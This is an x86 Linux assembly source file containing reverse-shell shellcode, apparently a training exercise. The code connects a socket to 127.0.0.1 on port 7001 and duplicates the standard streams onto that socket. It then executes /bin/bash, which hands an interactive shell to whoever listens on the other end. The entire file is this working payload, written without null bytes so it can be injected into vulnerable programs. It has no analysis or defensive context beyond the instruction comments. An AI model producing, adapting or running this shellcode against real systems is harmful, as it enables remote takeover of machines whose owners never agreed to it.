global _start

section .text
    
_start:
    ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    xor     eax, eax
    mov     ax, 0x167       ; eax = 359
    xor     ebx, ebx
    mov     bl, 0x2         ; ebx = 2
    xor     ecx, ecx
    add     ecx, 1          ; ecx = 1
    xor     edx, edx        ; edx = 0
    int     0x80            ; syscall
    mov     edi, eax        ; edi = eax = socket fd
    
    ; connect(3, {sa_family=AF_INET, sin_port=htons(7001), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
    ; create the sockaddr_in
    xor     eax, eax
    push    eax
    push    eax
    push    dword 0x0100007f
    push    word 0x591b
    push    word 0x2
    ; now esp points to the 16 byte struct
    mov     ax, 0x16a       ; eax = 362 = connect()
    mov     ebx, edi        ; ebx = edi = socket fd
    mov     ecx, esp        ; ecx = esp = pointer to sockaddr_in
    add     edx, 16         ; edx = 16 = sizeof(sockaddr_in)
    int     0x80            ; syscall 
    
    ; int dup2(int oldfd, int newfd);
    xor     eax, eax
    add     eax, 63         ; eax = 63 = dup2()
    mov     ebx, edi        ; ebx = edi = socket fd
    xor     ecx, ecx        ; ecx = 0 = stdin
    int     0x80            ; dup2(client, 0)
    
    xor     eax, eax
    add     eax, 63         ; eax = 63 = dup2()
    add     ecx, 1          
    int     0x80            ; dup2(client, 1)
    
    xor     eax, eax
    add     eax, 63         ; eax = 63 = dup2()
    add     ecx, 1          
    int     0x80            ; dup2(client, 2)
    
    ; execve("////bin/bash", ..)
    xor     eax, eax
    push    eax             ; push NULL 
    push    0x68736162      ; "hsab"
    push    0x2f6e6962      ; "/nib"
    push    0x2f2f2f2f      ; "////"
    mov     ebx, esp        ; ebx = esp = "////bin/bash"
    push    eax             ; push NULL
    mov     edx, esp        ; edx = esp = NULL
    push    ebx             ; push "////bin/bash" pointer
    mov     ecx, esp        ; ecx = esp = argv[]
    xor     eax, eax 
    add     eax, 11         ; eax = 11 = execve()
    int     0x80
    xor     eax, eax
    

    
    
   
